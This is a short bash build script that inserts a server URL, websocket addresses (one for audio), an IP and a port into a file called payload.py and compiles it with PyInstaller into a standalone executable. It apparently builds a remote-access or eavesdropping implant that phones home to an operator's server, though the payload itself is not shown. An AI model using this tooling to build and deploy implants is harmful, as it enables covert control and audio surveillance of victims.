#!/bin/bash
SERVER_URL=$1
WEBSOCKET_URL=$2
WEBSOCKET_AUDIO=$3
IP_ADDRESS=$4
PORT=$5
if [ -z "$SERVER_URL" ] || [ -z "$WEBSOCKET_URL" ] || [ -z "$WEBSOCKET_AUDIO" ] || [ -z "$IP_ADDRESS" ] || [ -z "$PORT" ]; then
  echo "Usage: ./build.sh SERVER_URL WEBSOCKET_URL WEBSOCKET_AUDIO IP_ADDRESS PORT"
  exit 1
fi
echo "Creating temporary build file..."
cp payload.py payload_temp.py
sed -i "s|__SERVER_URL__|$SERVER_URL|g" payload_temp.py
sed -i "s|__WEBSOCKET_URL__|$WEBSOCKET_URL|g" payload_temp.py
sed -i "s|__WEBSOCKET_AUDIO__|$WEBSOCKET_AUDIO|g" payload_temp.py
sed -i "s|__IP_ADDRESS__|$IP_ADDRESS|g" payload_temp.py
sed -i "s|__PORT__|$PORT|g" payload_temp.py
echo "Building executable..."
pyinstaller --onefile payload_temp.py
rm -rf payload_temp.py
if [ $? -eq 0 ]; then
  {
    echo "===================="
    echo "SERVER_URL=$SERVER_URL"
    echo "WEBSOCKET_URL=$WEBSOCKET_URL"
    echo "WEBSOCKET_AUDIO=$WEBSOCKET_AUDIO"
    echo "IP_ADDRESS=$IP_ADDRESS"
    echo "PORT=$PORT"
    echo "===================="
  } >> build_log.txt
fi
echo "Done!"